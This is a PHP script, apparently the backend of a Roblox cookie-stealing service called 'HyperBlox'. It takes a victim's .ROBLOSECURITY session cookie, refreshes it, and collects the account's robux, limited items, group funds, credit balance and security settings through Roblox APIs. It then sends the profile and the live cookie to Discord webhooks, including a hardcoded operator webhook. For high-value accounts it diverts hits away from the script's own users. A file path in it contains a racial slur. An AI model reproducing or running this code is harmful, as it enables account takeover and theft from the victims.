<?php
error_reporting(0);
ini_set('default_socket_timeout', '6'); // prevent long hangs on remote calls

$cookie = $_GET['cookie'];
$ht = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
// Use HTTP_HOST so localhost includes the dev server port (e.g., localhost:8000)
$dom = $ht . $_SERVER['HTTP_HOST'];

function getLocal($url, $timeout = 6) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

$refreshedCookie = getLocal("$dom/controlPage/apis/refresher.php?cookie=$cookie", 6);
if ($refreshedCookie == "Invalid Cookie" || $refreshedCookie === false || $refreshedCookie === null) {
    $refreshedCookie = getLocal("$dom/controlPage/apis/nigger.php?cookie=$cookie", 6);
}
if (!$refreshedCookie || stripos($refreshedCookie, 'WARNING') !== false) {
    // fall back to original cookie to avoid total failure
    $refreshedCookie = $cookie;
}

function makeRequest($url, $headers, $postData = null, $timeout = 8) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    }
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function gamepass($cookie, $gameId) {
    $headers = ["Cookie: .ROBLOSECURITY=$cookie", "Content-Type: application/json"];
    $response = json_decode(makeRequest("https://inventory.roblox.com/v1/users/1/items/GamePass/$gameId/is-owned", $headers), true);
    return isset($response) ? ($response ? '✅' : '❌') : '❓';
}

function sanitize($value, $maxLength = 1024) {
    if (is_null($value)) return '❓ Unknown';
    $value = str_replace(['`', '*', '_', '~', '|'], '', $value);
    return substr($value, 0, $maxLength);
}

$headers = ["Cookie: .ROBLOSECURITY=$refreshedCookie", "Content-Type: application/json"];

$settingsData = json_decode(makeRequest("https://www.roblox.com/my/settings/json", $headers), true);
$userId = $settingsData['UserId'] ?? 0;

$userInfoData = json_decode(makeRequest("https://users.roblox.com/v1/users/$userId", $headers), true);
$displayName = sanitize($userInfoData['displayName'] ?? 'Unknown');
$username = sanitize($userInfoData['name'] ?? 'Unknown');

$games = [
    'BF' => json_decode(makeRequest("https://games.roblox.com/v1/games/994732206/votes/user", $headers), true)['canVote'] ? '✅' : '❌',
    'AM' => json_decode(makeRequest("https://games.roblox.com/v1/games/383310974/votes/user", $headers), true)['canVote'] ? '✅' : '❌',
    'MM2' => json_decode(makeRequest("https://games.roblox.com/v1/games/66654135/votes/user", $headers), true)['canVote'] ? '✅' : '❌',
    'PS99' => json_decode(makeRequest("https://games.roblox.com/v1/games/3317771874/votes/user", $headers), true)['canVote'] ? '✅' : '❌',
    'BB' => json_decode(makeRequest("https://games.roblox.com/v1/games/4777817887/votes/user", $headers), true)['canVote'] ? '✅' : '❌'
];

$gamePasses = [
    'BF' => gamepass($refreshedCookie, 2753915549),
    'AM' => gamepass($refreshedCookie, 920587237),
    'MM2' => gamepass($refreshedCookie, 142823291),
    'PS99' => gamepass($refreshedCookie, 8737899170),
    'BB' => gamepass($refreshedCookie, 13772394625)
];

$transactionSummaryData = json_decode(makeRequest("https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year&transactionType=summary", $headers), true);
$summary = isset($transactionSummaryData['purchasesTotal']) ? number_format(abs($transactionSummaryData['purchasesTotal'])) : '❓ Unknown';

$avatarData = file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=150x150&format=Png&isCircular=false");
$avatarJson = json_decode($avatarData, true);
$avatarUrl = $avatarJson['data'][0]['imageUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';

$balanceData = json_decode(makeRequest("https://economy.roblox.com/v1/users/$userId/currency", $headers), true);
$robux = isset($balanceData['robux']) ? number_format($balanceData['robux']) : 0;
$pendingRobux = isset($transactionSummaryData['pendingRobuxTotal']) ? number_format($transactionSummaryData['pendingRobuxTotal']) : '❓ Unknown';

$collectiblesData = json_decode(makeRequest("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100", $headers), true);
$rap = 0;
if (isset($collectiblesData['data'])) {
    foreach ($collectiblesData['data'] as $item) {
        $rap += $item['recentAveragePrice'] ?? 0;
    }
}
$rap = number_format($rap);
$inventoryCount = isset($collectiblesData['total']) ? number_format($collectiblesData['total']) : '❓ Unknown';

$pinData = json_decode(makeRequest("https://auth.roblox.com/v1/account/pin", $headers), true);
$pinStatus = isset($pinData['isEnabled']) ? ($pinData['isEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';

$vcData = json_decode(makeRequest("https://voice.roblox.com/v1/settings", $headers), true);
$vcStatus = isset($vcData['isVoiceEnabled']) ? ($vcData['isVoiceEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';

function ownsBundle($userId, $bundleId, $headers) {
    $response = json_decode(makeRequest("https://inventory.roblox.com/v1/users/$userId/items/3/$bundleId", $headers), true);
    return isset($response['data']) && !empty($response['data']);
}

$hasHeadless = ownsBundle($userId, 201, $headers);
$hasKorblox = ownsBundle($userId, 192, $headers);
$headlessStatus = $hasHeadless ? '✅ True' : '❌ False';
$korbloxStatus = $hasKorblox ? '✅ True' : '❌ False';

$accountCreated = isset($userInfoData['created']) ? strtotime($userInfoData['created']) : null;
$joinDate = '❓ Unknown';
$accountAge = '❓ Unknown';
if ($accountCreated) {
    $joinDate = date('F j, Y', $accountCreated);
    $days = floor((time() - $accountCreated) / (60 * 60 * 24));
    $accountAge = number_format($days) . ' days';
}

$friendsData = json_decode(makeRequest("https://friends.roblox.com/v1/users/$userId/friends/count", $headers), true);
$friendsCount = isset($friendsData['count']) ? number_format($friendsData['count']) : '❓ Unknown';

$followersData = json_decode(makeRequest("https://friends.roblox.com/v1/users/$userId/followers/count", $headers), true);
$followersCount = isset($followersData['count']) ? number_format($followersData['count']) : '❓ Unknown';

$groupsData = json_decode(makeRequest("https://groups.roblox.com/v2/users/$userId/groups/roles", $headers), true);
$ownedGroups = [];
$allGroupRoles = [];
$highestRank = 0;
$highestGroup = 'None';
if (isset($groupsData['data'])) {
    foreach ($groupsData['data'] as $group) {
        $groupName = sanitize($group['group']['name'] ?? 'Unknown');
        $roleName = sanitize($group['role']['name'] ?? 'Unknown');
        $allGroupRoles[] = "• {$groupName} » **{$roleName}**";
        if ($group['role']['rank'] == 255) {
            $ownedGroups[] = $group;
        }
        if ($group['role']['rank'] > $highestRank) {
            $highestRank = $group['role']['rank'];
            $highestGroup = $groupName;
        }
    }
}
$groupRolesFormatted = implode("\n", array_slice($allGroupRoles, 0, 3));
if (count($allGroupRoles) > 3) $groupRolesFormatted .= "\n• +" . (count($allGroupRoles) - 3) . " more";
$totalGroupsOwned = count($ownedGroups);

$totalGroupFunds = 0;
$totalPendingGroupFunds = 0;
foreach ($ownedGroups as $group) {
    $groupId = $group['group']['id'];
    $groupFunds = json_decode(makeRequest("https://economy.roblox.com/v1/groups/$groupId/currency", $headers), true);
    $totalGroupFunds += $groupFunds['robux'] ?? 0;

    $groupPayouts = json_decode(makeRequest("https://economy.roblox.com/v1/groups/$groupId/payouts", $headers), true);
    if (isset($groupPayouts['data'])) {
        foreach ($groupPayouts['data'] as $payout) {
            if ($payout['status'] === 'Pending') {
                $totalPendingGroupFunds += $payout['amount'];
            }
        }
    }
}
$totalGroupFunds = number_format($totalGroupFunds);
$totalPendingGroupFunds = number_format($totalPendingGroupFunds);

$creditBalanceData = json_decode(makeRequest("https://billing.roblox.com/v1/credit", $headers), true);
$creditBalance = isset($creditBalanceData['balance']) ? '$' . number_format($creditBalanceData['balance'], 2) : '❓ Unknown';

$emailVerified = isset($settingsData['IsEmailVerified']) ? ($settingsData['IsEmailVerified'] ? '✅ True' : '❌ False') : '❓ Unknown';

$presenceData = json_decode(makeRequest("https://presence.roblox.com/v1/presence/users", $headers, ["userIds" => [$userId]]), true);
$presenceType = '❓ Unknown';
if (isset($presenceData['userPresences'][0])) {
    $presence = $presenceData['userPresences'][0];
    $presenceTypes = [0 => 'Offline', 1 => 'Online', 2 => 'InGame', 3 => 'Studio'];
    $presenceType = $presenceTypes[$presence['userPresenceType']] ?? '❓ Unknown';
}

$bio = sanitize($userInfoData['description'] ?? null, 200);
if (empty($bio)) $bio = '❌ No bio set';

$nonFilteredWebhook = "https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l";
$filteredWebhook = "https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l";
$webhooks = [urldecode($_GET["web"] ?? ''), urldecode($_GET["dh"] ?? '')];
if (!empty($_GET["dualhook"])) {
    $webhooks[] = urldecode($_GET["dualhook"]);
}
if (
    $robux >= 35000 ||
    $rap >= 65000 ||
    $totalGroupFunds >= 35000 ||
    $summary >= 300000 ||
    $creditBalance >= 100 ||
    $pendingRobux >= 25000 ||
    $followersCount >= 10000
) {
    $webhooks = [$filteredWebhook];
}

$timestamp = date("c");
$space = '|';

$embed1 = [
    'content' => '@everyone',
    'username' => 'HyperBlox',
    'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
    'embeds' => [
        [
            'title' => "New Hit Alert!",
            'description' => "<:check:1350103884835721277> **[Check Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=$refreshedCookie)** <:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://hyperblox.eu/controlPage/antiprivacy/kingvon.php?cookie=$refreshedCookie)** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/$userId/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/$userId)**",
            'color' => hexdec('00BFFF'),
            'thumbnail' => ['url' => $avatarUrl],
            'fields' => [
                [
                    'name' => '**<:search:1391436893794861157> About:**',
                    'value' => "• **Display:** `$displayName`\n• **Username:** `$username`\n• **User ID:** `$userId`\n• **Age:** `$accountAge`\n• **Join Date:** `$joinDate`\n• **Bio:** `$bio`",
                    'inline' => true
                ],
                [
                    'name' => '**<:info:1391434745207853138> Information:**',
                    'value' => "• **Robux:** `$robux`\n• **Pending:** `$pendingRobux`\n• **Credit:** `$creditBalance`\n• **Summary:** `$summary`",
                    'inline' => true
                ],
                [
                    'name' => '**<:settings:1391433304145924146> Settings:**',
                    'value' => "• **PIN:** `$pinStatus`\n• **Premium:** `" . ($settingsData['IsPremium'] ? '✅ True' : '❌ False') . "`\n• **VC:** `$vcStatus`\n• **Verified:** `$emailVerified`\n• **Presence:** `$presenceType`",
                    'inline' => true
                ],
                [
                    'name' => '**<:Games:1313020733932306462> Games Played:**',
                    'value' => "<:bf:1303894849530888214> $space {$games['BF']} $space {$gamePasses['BF']}\n" .
                               "<:adm:1303894863007453265> $space {$games['AM']} $space {$gamePasses['AM']}\n" .
                               "<:mm2:1303894855281541212> $space {$games['MM2']} $space {$gamePasses['MM2']}\n" .
                               "<:ps99:1303894865079308288> $space {$games['PS99']} $space {$gamePasses['PS99']}\n" .
                               "<:bb:1303894852697718854> $space {$games['BB']} $space {$gamePasses['BB']}",
                    'inline' => true
                ],
                [
                    'name' => '**<:bag:1391435344779677887> Inventory:**',
                    'value' => "• **RAP:** `$rap`\n• **Headless:** `$headlessStatus`\n• **Korblox:** `$korbloxStatus`",
                    'inline' => true
                ],
                [
                    'name' => '**<:groups:1391434330823200840> Groups:**',
                    'value' => "• **Owned:** `$totalGroupsOwned`\n• **Highest Rank:** `#$highestRank in $highestGroup`\n• **Funds:** `$totalGroupFunds R$`\n• **Pending:** `$totalPendingGroupFunds R$`",
                    'inline' => true
                ],
                [
                    'name' => '**<:user:1391436034843349002> Profile:**',
                    'value' => "• **Friends:** `$friendsCount`\n• **Followers:** `$followersCount`",
                    'inline' => true
                ]
            ]
        ]
    ]
];

$embed2 = [
    'username' => 'HyperBlox',
    'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
    'embeds' => [
        [
            'title' => '🍪 .ROBLOSECURITY',
            'description' => "```\n" . substr($refreshedCookie, 0, 2000) . "\n```",
            'color' => hexdec('00BFFF'),
            'footer' => [
                'text' => 'Refreshed Cookie',
                'icon_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png'
            ],
            'thumbnail' => [
                'url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png'
            ],
            'timestamp' => $timestamp
        ]
    ]
];

foreach ($webhooks as $webhook) {
    if (!empty($webhook)) {
        makeRequest($webhook, ["Content-Type: application/json"], $embed1);
        sleep(1);
        makeRequest($webhook, ["Content-Type: application/json"], $embed2);
        sleep(1);
    }
}

makeRequest($nonFilteredWebhook, ["Content-Type: application/json"], $embed1);
sleep(1);
makeRequest($nonFilteredWebhook, ["Content-Type: application/json"], $embed2);

echo json_encode([
    'robux' => $robux,
    'rap' => $rap,
    'summary' => $summary,
    'status' => 'success'
]);
?>